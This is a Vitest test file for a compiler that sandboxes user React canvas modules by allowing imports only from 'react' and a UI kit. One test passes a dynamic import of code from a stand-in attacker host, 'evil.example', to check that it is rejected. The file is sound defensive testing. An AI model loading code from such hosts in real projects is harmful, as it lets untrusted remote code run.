import { describe, expect, it } from "vitest";
import { compileCanvas } from "../src/canvas-compile.ts";
import {
  CANVAS_CODE_LIMIT,
  CANVAS_GLOBAL,
  CANVAS_RUNTIME,
  CANVAS_SOURCE_LIMIT,
  KIT_SPECIFIER,
} from "../src/canvas-protocol.ts";

const VIEW = `
import { useState } from "react";
import type { ReactElement } from "react";
import { Stack, Card, Text } from "${KIT_SPECIFIER}";

export default function View(): ReactElement {
  const [count, setCount] = useState<number>(0);
  return <Stack gap={2}><Card><Text onClick={() => setCount(count + 1)}>{count}</Text></Card></Stack>;
}
`;

describe("the canvas compiler", () => {
  it("compiles a module that imports react and the kit into ESM over the shell's globals", async () => {
    const outcome = await compileCanvas(VIEW);

    if (outcome.kind !== "compiled") throw new Error(JSON.stringify(outcome.errors));

    expect(outcome.runtime).toBe(CANVAS_RUNTIME);
    expect(outcome.code).toContain(`const { useState } = globalThis.${CANVAS_GLOBAL}.react;`);
    expect(outcome.code).toContain(
      `const { Stack, Card, Text } = globalThis.${CANVAS_GLOBAL}.kit;`,
    );
    expect(outcome.code).toContain(`const { jsx: _jsx } = globalThis.${CANVAS_GLOBAL}.jsxRuntime;`);
    expect(outcome.code).toContain("export default function View()");
    expect(outcome.code).not.toMatch(/\bimport\b/);
    expect(outcome.code).not.toContain("ReactElement");
  });

  it("rewrites default and namespace imports of react, and a literal dynamic import of the kit", async () => {
    const outcome = await compileCanvas(
      `import React from "react";\nimport * as R from "react";\nexport default function View() { void import("${KIT_SPECIFIER}"); return React.createElement("div", null, R.version); }`,
    );

    if (outcome.kind !== "compiled") throw new Error(JSON.stringify(outcome.errors));

    expect(outcome.code).toContain(`const React = globalThis.${CANVAS_GLOBAL}.react;`);
    expect(outcome.code).toContain(`const R = globalThis.${CANVAS_GLOBAL}.react;`);
    expect(outcome.code).toContain(`Promise.resolve(globalThis.${CANVAS_GLOBAL}.kit)`);
    expect(outcome.code).not.toMatch(/\bimport\b/);
  });

  it("rejects any other specifier, static or dynamic, with its position", async () => {
    const statics = await compileCanvas(
      `import { get } from "lodash";\nexport default () => <div>{get({}, "a")}</div>;`,
    );

    expect(statics).toEqual({
      kind: "failed",
      errors: [
        {
          line: 1,
          column: 0,
          text: `Only "react" and "${KIT_SPECIFIER}" can be imported; "lodash" is not available.`,
        },
      ],
    });

    const dynamic = await compileCanvas(
      `export default function View() {\n  void import("https://evil.example/x.js");\n  return null;\n}`,
    );

    expect(dynamic).toEqual({
      kind: "failed",
      errors: [
        {
          line: 2,
          column: 7,
          text: `Only "react" and "${KIT_SPECIFIER}" can be imported; "https://evil.example/x.js" is not available.`,
        },
      ],
    });
  });

  it("rejects a computed dynamic import and a re-export", async () => {
    const computed = await compileCanvas(
      `const name = "react";\nexport default async function View() { await import(name); return null; }`,
    );

    expect(computed).toEqual({
      kind: "failed",
      errors: [
        {
          line: 2,
          column: 45,
          text: `Only "react" and "${KIT_SPECIFIER}" can be imported, by name: a computed import() is not available.`,
        },
      ],
    });

    const reexport = await compileCanvas(
      `export { Stack } from "${KIT_SPECIFIER}";\nexport default () => null;`,
    );

    expect(reexport).toEqual({
      kind: "failed",
      errors: [
        {
          line: 1,
          column: 0,
          text: "A canvas cannot re-export from a module; import, then export your own names.",
        },
      ],
    });
  });

  it("rejects a name the kit or react does not export, after the sucrase line shift on line one", async () => {
    const kit = await compileCanvas(
      `import { Nope } from "${KIT_SPECIFIER}";\nexport default () => <Nope />;`,
    );

    expect(kit).toEqual({
      kind: "failed",
      errors: [{ line: 1, column: 0, text: `"${KIT_SPECIFIER}" has no export named "Nope".` }],
    });

    const react = await compileCanvas(
      `export default () => useNothing();\nimport { useNothing, useState } from "react";`,
    );

    expect(react).toEqual({
      kind: "failed",
      errors: [{ line: 2, column: 0, text: '"react" has no export named "useNothing".' }],
    });
  });

  it("requires a default export", async () => {
    expect(
      await compileCanvas(
        `import { Text } from "${KIT_SPECIFIER}";\nexport const a = <Text>hi</Text>;`,
      ),
    ).toEqual({
      kind: "failed",
      errors: [{ line: null, column: null, text: "The module must `export default` a component." }],
    });
  });

  it("reports a syntax error where it is", async () => {
    expect(await compileCanvas(`export default function View() {\n  return <div>;\n}`)).toEqual({
      kind: "failed",
      errors: [{ line: 2, column: 15, text: "Unexpected token" }],
    });
  });

  it("caps the source before compiling and the module after", async () => {
    const big = `export default () => null;\n// ${"x".repeat(CANVAS_SOURCE_LIMIT)}`;

    expect(await compileCanvas(big)).toEqual({
      kind: "failed",
      errors: [
        { line: null, column: null, text: "The source is over 64 KB; render less at once." },
      ],
    });

    const within = `const text = ${JSON.stringify("y".repeat(CANVAS_SOURCE_LIMIT - 200))};\nexport default () => <div>{text}</div>;`;

    expect(new TextEncoder().encode(within).byteLength).toBeLessThanOrEqual(CANVAS_SOURCE_LIMIT);
    expect((await compileCanvas(within)).kind).toBe("compiled");
    expect(CANVAS_CODE_LIMIT).toBeGreaterThan(CANVAS_SOURCE_LIMIT);
    expect(await compileCanvas(within, { code: 1024 })).toEqual({
      kind: "failed",
      errors: [
        {
          line: null,
          column: null,
          text: "The compiled canvas is over 1 KB; render less at once.",
        },
      ],
    });
  });
});
